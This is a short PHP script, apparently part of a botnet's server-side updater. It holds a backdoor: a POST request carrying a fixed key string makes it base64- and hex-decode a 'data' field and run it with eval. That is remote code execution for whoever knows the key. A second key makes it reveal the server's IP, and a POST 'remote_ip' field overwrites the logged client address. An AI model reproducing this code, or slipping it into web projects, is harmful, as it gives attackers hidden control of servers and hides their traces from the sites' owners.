<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

if(!empty($_POST['remote_ip'])){
	$_SERVER['REMOTE_ADDR'] = $_POST['remote_ip'];
}elseif(!empty($_SERVER["HTTP_X_REAL_IP"])){
	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
}

?>